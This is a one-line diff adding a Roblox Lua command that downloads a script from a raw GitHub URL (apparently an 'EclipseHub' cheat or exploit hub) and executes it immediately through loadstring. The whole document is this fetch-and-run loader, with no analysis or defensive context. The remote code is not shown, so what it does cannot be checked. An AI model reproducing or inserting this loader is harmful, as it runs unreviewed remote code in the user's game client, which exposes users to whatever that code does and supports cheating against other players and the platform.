@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/EclipseHub22/MAIN/main/Script"))()
